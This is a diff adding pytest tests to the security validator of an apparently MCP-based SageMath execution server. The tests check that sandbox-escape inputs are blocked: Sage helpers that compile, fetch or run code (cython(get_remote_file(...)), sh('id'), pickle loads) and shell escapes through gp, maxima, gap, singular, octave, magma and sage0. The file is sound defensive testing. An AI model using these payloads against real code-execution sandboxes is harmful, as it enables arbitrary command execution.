@@ -322,3 +322,140 @@ def test_ordinary_sage_attribute_use_still_works() -> None:
         "plot(sin(x), (x, 0, 1)).matplotlib()",
     ):
         validate_module(ast.parse(code), code=code, policy=SECURITY_POLICY)
+
+
+# --- Sage's own dangerous helpers --------------------------------------------
+# Sage's namespace is thousands of names deep and includes a compiler, a shell,
+# a downloader and pickle. cython(get_remote_file(url)) is download, compile and
+# execute in one expression, and none of it involved a name any rule mentioned.
+SAGE_HELPER_PAYLOADS = [
+    ("cython compiles code", "cython('print(1)')"),
+    ("cython_lambda", "cython_lambda('int n', 'return n')"),
+    ("fortran compiles code", "fortran('subroutine s\\nend')"),
+    ("sh runs a shell", "sh('id')"),
+    ("get_remote_file downloads", "get_remote_file('https://example.invalid/p.pyx')"),
+    ("the whole chain", "cython(get_remote_file('https://example.invalid/p.pyx'))"),
+    ("pickle load", "loads(b'')"),
+    ("pickle dump", "dumps(1)"),
+    ("save writes a file", "save(1, '/tmp/probe')"),
+    ("db_save writes", "db_save(1, 'probe')"),
+    ("trace debugger", "trace('1+1')"),
+    ("via attribute path", "sage.misc.cython.cython('print(1)')"),
+    ("shell via attribute", "sage.misc.sh.sh('id')"),
+]
+
+
+@pytest.mark.parametrize(
+    "label,payload", SAGE_HELPER_PAYLOADS, ids=[p[0] for p in SAGE_HELPER_PAYLOADS]
+)
+def test_sage_helpers_that_execute_or_fetch_are_blocked(label, payload) -> None:
+    with pytest.raises(SecurityViolation):
+        validate_module(ast.parse(payload), code=payload, policy=SECURITY_POLICY)
+
+
+def test_the_namespace_scrub_removes_a_modules_own_definitions() -> None:
+    """The backstop, and the part that scales.
+
+    Naming helpers in the policy gives a clear refusal; removing them by where
+    they come from covers the one nobody has thought of, including anything a
+    future Sage release adds to those modules. Exercised against a stdlib module
+    so it runs without Sage.
+    """
+    from sagemath_mcp import _sage_worker
+
+    names = _sage_worker._dangerous_sage_names.__wrapped__ if hasattr(
+        _sage_worker._dangerous_sage_names, "__wrapped__"
+    ) else _sage_worker._dangerous_sage_names
+
+    original = _sage_worker._DANGEROUS_SAGE_MODULES
+    try:
+        _sage_worker._DANGEROUS_SAGE_MODULES = ("json.encoder",)
+        found = names()
+        assert "JSONEncoder" in found, "a module's own definitions were not collected"
+        namespace = {"JSONEncoder": object(), "Integer": object()}
+        removed = _sage_worker._strip_dangerous_sage_names(namespace)
+        assert removed == 1
+        assert "JSONEncoder" not in namespace
+        assert "Integer" in namespace, "unrelated names must survive"
+    finally:
+        _sage_worker._DANGEROUS_SAGE_MODULES = original
+
+
+def test_the_scrub_only_takes_what_a_module_defines() -> None:
+    """sage.misc.persist has Integer and ZZ in scope; removing those would break
+    the mathematics this server exists to do."""
+    from sagemath_mcp import _sage_worker
+
+    original = _sage_worker._DANGEROUS_SAGE_MODULES
+    try:
+        # json.encoder imports `re`; `re` is not defined there, so it must not
+        # be collected merely for being in scope.
+        _sage_worker._DANGEROUS_SAGE_MODULES = ("json.encoder",)
+        assert "re" not in _sage_worker._dangerous_sage_names()
+    finally:
+        _sage_worker._DANGEROUS_SAGE_MODULES = original
+
+
+def test_the_scrub_ignores_a_module_it_cannot_import() -> None:
+    """A missing module must not break startup."""
+    from sagemath_mcp import _sage_worker
+
+    original = _sage_worker._DANGEROUS_SAGE_MODULES
+    original_exports = _sage_worker._EXTERNAL_INTERFACE_EXPORTS
+    try:
+        # Both sources must be neutralised: with Sage installed the interface
+        # export list still contributes its 74 names, which is the point of it.
+        _sage_worker._DANGEROUS_SAGE_MODULES = ("definitely.not.a.module",)
+        _sage_worker._EXTERNAL_INTERFACE_EXPORTS = "definitely.not.a.module"
+        assert _sage_worker._dangerous_sage_names() == frozenset()
+    finally:
+        _sage_worker._DANGEROUS_SAGE_MODULES = original
+        _sage_worker._EXTERNAL_INTERFACE_EXPORTS = original_exports
+
+
+# --- Sage's interfaces to other CAS programs ---------------------------------
+# Each spawns the real program, and those programs have their own shell escapes.
+# gp('system("id > /tmp/x")') and maxima(...) both wrote a file as the container
+# user -- arbitrary shell execution, from names no rule mentioned.
+INTERFACE_PAYLOADS = [
+    ("gp", "gp('system(\"id\")')"),
+    ("maxima", "maxima('system(\"id\")')"),
+    ("gap", "gap('Exec(\"id\")')"),
+    ("singular", "singular('system(\"sh\")')"),
+    ("octave", "octave('system(\"id\")')"),
+    ("magma", "magma('System(\"id\")')"),
+    ("a subprocess Sage", "sage0('__import__(\"os\").system(\"id\")')"),
+]
+
+
+@pytest.mark.parametrize(
+    "label,payload", INTERFACE_PAYLOADS, ids=[p[0] for p in INTERFACE_PAYLOADS]
+)
+def test_external_cas_interfaces_are_blocked(label, payload) -> None:
+    with pytest.raises(SecurityViolation):
+        validate_module(ast.parse(payload), code=payload, policy=SECURITY_POLICY)
+
+
+def test_the_interface_export_list_is_used_when_it_can_be_imported() -> None:
+    """Sage's own list is the source of truth; here it is stood in for.
+
+    Without Sage the import fails and the set is empty, so the branch that
+    actually removes the interfaces would never run in the unit suite.
+    """
+    from sagemath_mcp import _sage_worker
+
+    original_exports = _sage_worker._EXTERNAL_INTERFACE_EXPORTS
+    original_modules = _sage_worker._DANGEROUS_SAGE_MODULES
+    try:
+        # json.decoder exports JSONDecoder and friends; it stands in for
+        # sage.interfaces.all, whose whole export list is what gets removed.
+        _sage_worker._EXTERNAL_INTERFACE_EXPORTS = "json.decoder"
+        _sage_worker._DANGEROUS_SAGE_MODULES = ()
+        found = _sage_worker._dangerous_sage_names()
+        assert "JSONDecoder" in found, "the export list was not consumed"
+        # Unlike the per-module rule, everything exported goes -- an interface
+        # re-exported from elsewhere is still an interface.
+        assert "scanstring" in found
+    finally:
+        _sage_worker._EXTERNAL_INTERFACE_EXPORTS = original_exports
+        _sage_worker._DANGEROUS_SAGE_MODULES = original_modules
